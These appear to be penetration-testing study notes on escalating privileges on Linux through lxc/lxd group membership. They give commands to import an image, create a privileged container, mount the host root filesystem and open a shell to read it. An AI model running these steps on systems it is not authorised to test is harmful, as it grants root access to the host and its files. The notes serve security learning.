Containers: share an operating system and isolate application processes from the rest of the system
Virtualization: allows multiple operating systems to run simultaneously on a single system

LXC - Linux Containers
- Application container

LXD - Linux Daemon
- System container (contains entire operating system)

**Check if part of lxc or lxd group
```shell-session
id
```
- We can either create our own container and transfer it to target or use an existing container

```shell-session
cd ContainerImages
ls
```
- Such templates (ubuntu-template.tar.xz) often do not have passwords

**Import container as an image
```shell-session
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

**Initiate and Configure image
```shell-session
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

**Start container
```shell-session
lxc start privesc
lxc exec privesc /bin/sh
ls -l /mnt/root
```
